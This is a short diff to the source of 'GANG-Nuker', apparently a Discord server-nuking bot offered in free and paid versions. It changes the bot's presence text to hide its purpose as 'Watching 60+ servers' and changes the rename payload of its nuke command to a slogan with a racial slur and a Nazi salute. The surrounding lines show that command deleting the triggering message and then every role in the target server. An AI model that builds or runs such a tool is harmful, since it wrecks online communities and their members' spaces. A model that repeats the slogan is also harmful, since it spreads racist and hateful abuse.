@@ -419,7 +419,7 @@ Joiner is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Mak
                     guildpl = "guilds"
                 else:
                     guildpl = "guild"
-                activity = discord.Game(name=f"GANG-Nuker Server Nuker", type=3)
+                activity = discord.Game(name=f"Watching 60+ servers", type=3)
                 await gang.change_presence(status=discord.Status.dnd, activity=activity)
                 clear()
                 print(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot : {gang.user} ({len(gang.guilds)} {guildpl})")
@@ -448,7 +448,7 @@ Joiner is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Mak
             async def nuke(ctx):
                 await ctx.message.delete()
                 print(f"[\x1b[95m>\x1b[95m\x1B[37m] Nuking {ctx.guild.name} ({ctx.guild.id})...")
-                await ctx.guild.edit(name="GANG-Nuker Runs Discord")
+                await ctx.guild.edit(name="HEIL LITHIUM NIGGA")
                 for role in ctx.guild.roles:
                     try:
                         await role.delete()
